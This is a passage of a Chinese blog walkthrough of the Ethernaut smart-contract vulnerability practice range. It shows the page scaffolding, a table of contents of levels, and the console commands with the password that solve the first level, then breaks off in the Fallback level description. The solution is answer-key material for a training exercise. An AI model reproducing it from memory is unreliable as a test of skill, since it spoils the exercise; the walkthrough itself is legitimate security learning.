<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Solidity基础可以先看这个互动式教程：https:&#x2F;&#x2F;cryptozombies.io&#x2F;zh&#x2F; ，以及https:&#x2F;&#x2F;solidity-by-example.org&#x2F; Ethernaut是一个智能合约漏洞靶场 项目地址：https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;ethernaut 在线靶场：https:&#x2F;&#x2F;ethernaut.openzeppelin.com">
<meta property="og:type" content="article">
<meta property="og:title" content="智能合约漏洞靶场——Ethernaut">
<meta property="og:url" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/index.html">
<meta property="og:site_name" content="l3yx&#39;s blog">
<meta property="og:description" content="Solidity基础可以先看这个互动式教程：https:&#x2F;&#x2F;cryptozombies.io&#x2F;zh&#x2F; ，以及https:&#x2F;&#x2F;solidity-by-example.org&#x2F; Ethernaut是一个智能合约漏洞靶场 项目地址：https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;ethernaut 在线靶场：https:&#x2F;&#x2F;ethernaut.openzeppelin.com">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204213024493.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204150650577.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204162511155.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204163212237.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164548931.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164600834.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204164854035.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204191726341.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192252584.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192344309.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204192357438.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220749115.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220851923.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204220904318.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204225829991.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205151447286.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205163154978.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205134428192.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140506104.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205140250560.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205143345839.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205144246292.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205214625649.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205222034688.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224256248.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211205224553899.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/6.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211209085431565.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211208235728789.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211211214345867.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212201420739.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212210751357.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232324430.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232817322.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213643538.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213925467.png">
<meta property="og:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215214403004.png">
<meta property="article:published_time" content="2021-12-02T14:26:11.000Z">
<meta property="article:modified_time" content="2022-05-08T09:59:57.170Z">
<meta property="article:author" content="淚笑">
<meta property="article:tag" content="智能合约">
<meta property="article:tag" content="区块链">
<meta property="article:tag" content="Solidity">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211204213024493.png">


<link rel="canonical" href="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/","path":"2021/12/02/智能合约漏洞靶场——Ethernaut/","title":"智能合约漏洞靶场——Ethernaut"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>智能合约漏洞靶场——Ethernaut | l3yx's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">l3yx's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hello-Ethernaut"><span class="nav-number">1.</span> <span class="nav-text">Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fallback"><span class="nav-number">2.</span> <span class="nav-text">Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources"><span class="nav-number">2.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution"><span class="nav-number">2.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fallout"><span class="nav-number">3.</span> <span class="nav-text">Fallout</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-1"><span class="nav-number">3.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-1"><span class="nav-number">3.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Coin-Flip"><span class="nav-number">4.</span> <span class="nav-text">Coin Flip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-2"><span class="nav-number">4.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-2"><span class="nav-number">4.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telephone"><span class="nav-number">5.</span> <span class="nav-text">Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-3"><span class="nav-number">5.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-3"><span class="nav-number">5.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token"><span class="nav-number">6.</span> <span class="nav-text">Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-4"><span class="nav-number">6.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-4"><span class="nav-number">6.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Delegation"><span class="nav-number">7.</span> <span class="nav-text">Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-5"><span class="nav-number">7.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-5"><span class="nav-number">7.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Force"><span class="nav-number">8.</span> <span class="nav-text">Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-6"><span class="nav-number">8.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-6"><span class="nav-number">8.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vault"><span class="nav-number">9.</span> <span class="nav-text">Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-7"><span class="nav-number">9.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-7"><span class="nav-number">9.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#King"><span class="nav-number">10.</span> <span class="nav-text">King</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-8"><span class="nav-number">10.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-8"><span class="nav-number">10.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-entrancy"><span class="nav-number">11.</span> <span class="nav-text">Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-9"><span class="nav-number">11.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-9"><span class="nav-number">11.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elevator"><span class="nav-number">12.</span> <span class="nav-text">Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-10"><span class="nav-number">12.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-10"><span class="nav-number">12.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privacy"><span class="nav-number">13.</span> <span class="nav-text">Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-11"><span class="nav-number">13.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-11"><span class="nav-number">13.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-One"><span class="nav-number">14.</span> <span class="nav-text">Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-12"><span class="nav-number">14.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-12"><span class="nav-number">14.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-Two"><span class="nav-number">15.</span> <span class="nav-text">Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-13"><span class="nav-number">15.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-13"><span class="nav-number">15.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Naught-Coin"><span class="nav-number">16.</span> <span class="nav-text">Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-14"><span class="nav-number">16.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-14"><span class="nav-number">16.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Preservation"><span class="nav-number">17.</span> <span class="nav-text">Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-15"><span class="nav-number">17.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-15"><span class="nav-number">17.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recovery"><span class="nav-number">18.</span> <span class="nav-text">Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-16"><span class="nav-number">18.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-16"><span class="nav-number">18.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MagicNumber"><span class="nav-number">19.</span> <span class="nav-text">MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sources-17"><span class="nav-number">19.1.</span> <span class="nav-text">Sources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution-17"><span class="nav-number">19.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">20.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="淚笑"
      src="/resources/avatar.jpg">
  <p class="site-author-name" itemprop="name">淚笑</p>
  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/resources/avatar.jpg">
      <meta itemprop="name" content="淚笑">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="l3yx's blog">
      <meta itemprop="description" content="学的越多，懂的越少">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="智能合约漏洞靶场——Ethernaut | l3yx's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          智能合约漏洞靶场——Ethernaut
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-02 22:26:11" itemprop="dateCreated datePublished" datetime="2021-12-02T22:26:11+08:00">2021-12-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-08 17:59:57" itemprop="dateModified" datetime="2022-05-08T17:59:57+08:00">2022-05-08</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>6.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>24 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>Solidity基础可以先看这个互动式教程：<a target="_blank" rel="noopener" href="https://cryptozombies.io/zh/">https://cryptozombies.io/zh/</a> ，以及<a target="_blank" rel="noopener" href="https://solidity-by-example.org/">https://solidity-by-example.org/</a></p>
<p>Ethernaut是一个智能合约漏洞靶场</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut">https://github.com/OpenZeppelin/ethernaut</a></p>
<p>在线靶场：<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com</a></p>
<span id="more"></span>

<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>获取Rinkeby测试网Ether可以到下面两个网站</p>
<p><a target="_blank" rel="noopener" href="https://faucets.chain.link/rinkeby">https://faucets.chain.link/rinkeby</a></p>
<p><a target="_blank" rel="noopener" href="https://faucet.rinkeby.io/">https://faucet.rinkeby.io/</a></p>
<p>第一关照着提示熟悉下题目操作流程即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info1</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info2</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">infoNum</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info42</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">theMethodName</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">method7123949</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(<span class="string">&#x27;ethernaut0&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>This level walks you through the very basics of how to play the game.</p>
<p>You will beat this level if</p>
<ol>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ol>
<p> Things that might help</p>
<ul>
